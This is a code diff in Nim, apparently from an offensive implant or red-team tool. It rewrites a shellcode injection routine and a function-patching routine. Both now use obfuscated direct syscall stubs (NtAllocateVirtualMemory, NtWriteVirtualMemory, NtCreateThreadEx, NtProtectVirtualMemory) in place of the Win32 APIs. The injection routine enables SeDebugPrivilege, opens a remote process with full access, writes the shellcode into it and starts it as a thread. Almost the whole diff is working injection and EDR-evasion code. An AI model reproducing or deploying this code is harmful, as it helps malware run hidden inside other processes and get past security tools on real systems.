@@ -43,7 +43,7 @@ proc patch_func*(command_name: string): bool =
     # NtProtectVirtualMemory gonna change func_addr so save it
     func_addr2 = func_addr
 
-    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
+    nt_status = EIYkmUCPaWkVhdPS(  # NtProtectVirtualMemory
         process_h, 
         addr func_addr, 
         addr patch_len, 
@@ -53,7 +53,7 @@ proc patch_func*(command_name: string): bool =
     if nt_status != STATUS_SUCCESS:
         return false
 
-    nt_status = OMQoAnSSJGeTcUxq(  # NtWriteVirtualMemory
+    nt_status = OaulqyCKIJNrYoKN(  # NtWriteVirtualMemory
         process_h,
         func_addr2,
         addr patch[0],
@@ -63,7 +63,7 @@ proc patch_func*(command_name: string): bool =
     if nt_status != ERROR_SUCCESS:
         return false
     
-    nt_status = eGHtTmjXcbZTDDUi(  # NtProtectVirtualMemory
+    nt_status = EIYkmUCPaWkVhdPS(  # NtProtectVirtualMemory
         process_h, 
         addr func_addr, 
         addr patch_len,
@@ -78,10 +78,14 @@ proc patch_func*(command_name: string): bool =
 
 proc inject_shellcode*(shellc: seq[byte], pid: int): bool = 
 
+    var shellc_size = cast[SIZE_T](shellc.len)
+    var remote_addr: PVOID
+    var thread_h: HANDLE
+
     # set debug privileges
     if not set_privilege("SeDebugPrivilege"):
         return false
-    
+
     # open remote process
     let process_h = OpenProcess(
     PROCESS_ALL_ACCESS, 
@@ -90,44 +94,40 @@ proc inject_shellcode*(shellc: seq[byte], pid: int): bool =
     )
     if process_h == 0:
         return false
-    
-    # allocate memory in remotre process
-    let remote_address = VirtualAllocEx(
-        process_h,
-        NULL,
-        cast[SIZE_T](shellc.len),
-        MEM_COMMIT,
-        PAGE_EXECUTE_READ_WRITE
-    )
 
-    # write shellcode to remote process
-    let write_success = WriteProcessMemory(
-        process_h, 
-        remote_address,
-        unsafeAddr shellc[0],
-        cast[SIZE_T](shellc.len),
-        nil
-    )
-    if not bool(write_success):
-        CloseHandle(process_h)
+    if RyNyHmVLmPVVJaOX(  # NtAllocateVirtualMemory
+        process_h,
+        addr remote_addr,
+        0,
+        addr shellc_size,
+        MEM_COMMIT or MEM_RESERVE,
+        PAGE_EXECUTE_READWRITE
+    ) != 0:
         return false
 
-    # start the remote shellcode as a thread
-    let thread_handle = CreateRemoteThread(
-        process_h, 
-        NULL,
-        0,
-        cast[LPTHREAD_START_ROUTINE](remote_address),
-        NULL, 
-        0, 
+    if OaulqyCKIJNrYoKN(  # NtWriteVirtualMemory
+        process_h,
+        remote_addr,
+        unsafeAddr shellc[0],
+        shellc_size,
         NULL
-    )
-
-    if thread_handle == 0:
+    ) != 0:
+        CloseHandle(process_h)
+        return false
+   
+    if GUAklSyZtyYwMqFf(  # NtCreateThreadEx
+        addr thread_h, 
+        GENERIC_EXECUTE, 
+        NULL,
+        process_h,
+        cast[LPTHREAD_START_ROUTINE](remote_addr),
+        NULL, FALSE, 0, 0, 0, NULL
+        ) != 0:
         CloseHandle(process_h)
         return false
     
     CloseHandle(process_h)
-    CloseHandle(thread_handle)
+    CloseHandle(thread_h)
+
     return true
     
